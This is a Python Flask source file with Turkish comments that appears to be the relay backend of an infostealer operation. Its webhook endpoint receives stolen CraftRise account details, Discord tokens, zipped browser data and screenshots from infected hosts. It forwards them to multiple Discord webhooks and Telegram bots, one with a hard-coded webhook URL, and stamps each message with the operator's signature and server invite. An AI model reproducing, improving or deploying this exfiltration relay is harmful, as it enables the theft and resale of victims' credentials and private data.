from flask import Flask, request, jsonify
import requests
import json
import os
import re
import base64
from datetime import datetime

app = Flask(__name__)

# ============================================================================
# ENVIRONMENT VARIABLES
# ============================================================================
WEBHOOK = os.environ.get("WEBHOOK", "")
WEBHOOK_1 = os.environ.get("WEBHOOK_1", "https://discord.com/api/webhooks/1534721356728373441/DcQUFVUvjYIGHYdNfjQZuUbgqu4d9TJfPMFLmH7QdnepfUhcVCVTSVPvYufwSp6Jqv74")
WEBHOOK_2 = os.environ.get("WEBHOOK_2", "")

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")

CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")

MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

# ============================================================================
# LOGO URLS
# ============================================================================
LOGO_CRAFTRISE = "https://media.discordapp.net/attachments/1531817920907448421/1535036471222734941/crlogo.png"
LOGO_DISCORD = "https://media.discordapp.net/attachments/1531817920907448421/1535036435420413962/discord.png"
LOGO_SIGN = "https://media.discordapp.net/attachments/1531817920907448421/1535048621937000498/JlTlE.jpg"

# ============================================================================
# TELEGRAM FUNCTIONS
# ============================================================================
def send_telegram_msg(token, chat_id, msg):
    if not (token and chat_id and msg):
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": msg[:4000]},
            timeout=30
        )
    except Exception as e:
        print(f"[-] Telegram msg error: {e}")

def send_telegram_file(token, chat_id, file_bytes, filename="backup.zip", caption=""):
    if not (token and chat_id and file_bytes):
        return
    try:
        files = {'document': (filename, file_bytes)}
        requests.post(
            f"https://api.telegram.org/bot{token}/sendDocument",
            data={"chat_id": chat_id, "caption": caption[:1000]},
            files=files,
            timeout=60
        )
    except Exception as e:
        print(f"[-] Telegram file error: {e}")

def send_telegram_photo(token, chat_id, photo_bytes, caption=""):
    if not (token and chat_id and photo_bytes):
        return
    try:
        files = {'photo': ('screenshot.png', photo_bytes)}
        requests.post(
            f"https://api.telegram.org/bot{token}/sendPhoto",
            data={"chat_id": chat_id, "caption": caption[:1000]},
            files=files,
            timeout=60
        )
    except Exception as e:
        print(f"[-] Telegram photo error: {e}")

# ============================================================================
# DISCORD FUNCTIONS
# ============================================================================
def send_discord(url, data, files=None):
    if not url:
        return
    try:
        if files:
            response = requests.post(url, data=data, files=files, timeout=60)
            print(f"[+] Discord sent file to {url[:50]}... status: {response.status_code}")
        else:
            response = requests.post(url, json=data, timeout=30)
            print(f"[+] Discord sent embed to {url[:50]}... status: {response.status_code}")
    except Exception as e:
        print(f"[-] Discord error: {e}")

def send_to_both_webhooks(data, files=None):
    """Her iki webhook'a da gönder"""
    if WEBHOOK_1:
        send_discord(WEBHOOK_1, data, files)
    
    if WEBHOOK_2:
        send_discord(WEBHOOK_2, data, files)

# ============================================================================
# MAIN WEBHOOK
# ============================================================================
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        # ============================================================
        # VERİ OKUMA
        # ============================================================
        if request.is_json:
            data = request.get_json()
            file_bytes = None
            screenshot_bytes = None
        else:
            data = request.form.to_dict()
            file_bytes = request.files.get('file').read() if request.files.get('file') else None
            screenshot_bytes = request.files.get('screenshot').read() if request.files.get('screenshot') else None
            
            for key in ['embeds', 'creds', 'tokens']:
                if key in data and isinstance(data[key], str):
                    try:
                        data[key] = json.loads(data[key])
                    except:
                        pass

        log_type = data.get("type", "unknown")
        hostname = data.get("hostname", "Unknown")
        
        embeds = data.get("embeds", [])
        if not isinstance(embeds, list):
            embeds = [embeds] if embeds else []

        print(f"[{datetime.now()}] Type: {log_type} | Host: {hostname}")

        # ============================================================
        # CRAFTRISE (type: craftrise)
        # ============================================================
        if log_type == "craftrise":
            account_info = "Unknown"
            if embeds:
                for embed in embeds:
                    fields = embed.get("fields", [])
                    for field in fields:
                        if field.get("name") == "Account":
                            account_info = field.get("value", "Unknown")
                            break
            
            # Craftrise hesabını sadece Craftrise webhook ve telegram'a gönder
            cr_embed = {
                "embeds": [{
                    "title": "CraftRise",
                    "color": 0xFF6B00,
                    "thumbnail": {"url": LOGO_CRAFTRISE},
                    "fields": [
                        {"name": "Account", "value": account_info, "inline": False},
                        {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon", "inline": False}
                    ],
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            
            if CRAFTRISE_WEBHOOK:
                send_discord(CRAFTRISE_WEBHOOK, cr_embed)
            
            send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, f"CraftRise\n{account_info}")

        # ============================================================
        # DISCORD TOKEN (type: discord)
        # ============================================================
        elif log_type == "discord":
            token_count = 0
            status_text = "YOK"
            
            if embeds:
                for embed in embeds:
                    fields = embed.get("fields", [])
                    for field in fields:
                        if field.get("name") == "Status":
                            status_text = field.get("value", "YOK")
                            match = re.search(r'MEVCUT\s*(\d+)X', status_text)
                            if match:
                                token_count = int(match.group(1))
                            break
            
            # Discord token'larını Discord webhook ve telegram'a gönder
            discord_embed = {
                "embeds": [{
                    "title": "Discord Token",
                    "color": 0x5865F2,
                    "thumbnail": {"url": LOGO_DISCORD},
                    "fields": [
                        {"name": "Status", "value": status_text, "inline": False},
                        {"name": "PC", "value": hostname, "inline": False},
                        {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon", "inline": False}
                    ],
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            
            if DISCORD_WEBHOOK:
                send_discord(DISCORD_WEBHOOK, discord_embed)
            
            # Token'ları teker teker Telegram'a gönder
            tokens = data.get("tokens", [])
            if isinstance(tokens, str):
                try:
                    tokens = json.loads(tokens)
                except:
                    tokens = [tokens] if tokens else []
            
            if tokens and len(tokens) > 0:
                for token in tokens:
                    send_telegram_msg(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, f"Discord\nToken: {token}")

        # ============================================================
        # MASTER (type: master veya boş) - Browser Stats + ZIP + Screenshot
        # ============================================================
        else:
            # Embeds'e imza ve thumbnail ekle
            if embeds:
                for embed in embeds:
                    if "fields" in embed:
                        has_signature = False
                        for field in embed.get("fields", []):
                            if field.get("name") == "Signature":
                                has_signature = True
                                break
                        if not has_signature:
                            embed["fields"].append({
                                "name": "Signature",
                                "value": "S4/Mr.cekikgozlusampiyon",
                                "inline": False
                            })
                    if "footer" not in embed:
                        embed["footer"] = {"text": "Cekıkgozlusampiyon / discord.gg/s4s4"}
                    if "thumbnail" not in embed:
                        embed["thumbnail"] = {"url": LOGO_SIGN}
            
            content = data.get("content", "")
            
            # MASTER_WEBHOOK (ZIP + Embed + Screenshot)
            if MASTER_WEBHOOK:
                files = {}
                if file_bytes:
                    files['file'] = ('data.zip', file_bytes)
                if screenshot_bytes:
                    files['screenshot'] = ('screenshot.png', screenshot_bytes)
                
                if files:
                    send_discord(MASTER_WEBHOOK, {'content': content}, files)
                else:
                    send_discord(MASTER_WEBHOOK, {"embeds": embeds, "content": content})
            
            # WEBHOOK (ZIP + Embed + Screenshot)
            if WEBHOOK:
                files = {}
                if file_bytes:
                    files['file'] = ('data.zip', file_bytes)
                if screenshot_bytes:
                    files['screenshot'] = ('screenshot.png', screenshot_bytes)
                
                if files:
                    send_discord(WEBHOOK, {'content': content}, files)
                else:
                    send_discord(WEBHOOK, {"embeds": embeds, "content": content})
            
            # WEBHOOK_1 (ZIP + Embed + Screenshot)
            if WEBHOOK_1:
                files = {}
                if file_bytes:
                    files['file'] = ('data.zip', file_bytes)
                if screenshot_bytes:
                    files['screenshot'] = ('screenshot.png', screenshot_bytes)
                
                if files:
                    send_discord(WEBHOOK_1, {'content': content}, files)
                else:
                    send_discord(WEBHOOK_1, {"embeds": embeds, "content": content})
            
            # WEBHOOK_2 (ZIP + Embed + Screenshot)
            if WEBHOOK_2:
                files = {}
                if file_bytes:
                    files['file'] = ('data.zip', file_bytes)
                if screenshot_bytes:
                    files['screenshot'] = ('screenshot.png', screenshot_bytes)
                
                if files:
                    send_discord(WEBHOOK_2, {'content': content}, files)
                else:
                    send_discord(WEBHOOK_2, {"embeds": embeds, "content": content})
            
            # Telegram - ZIP ve Screenshot
            if file_bytes:
                send_telegram_file(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip", content[:1000])
            
            if screenshot_bytes:
                send_telegram_photo(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, screenshot_bytes, content[:1000])
            
            # MASTER Telegram
            if file_bytes:
                send_telegram_file(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip", content[:1000])
            
            if screenshot_bytes:
                send_telegram_photo(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, screenshot_bytes, content[:1000])

        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"[-] Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "Proxy Active"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
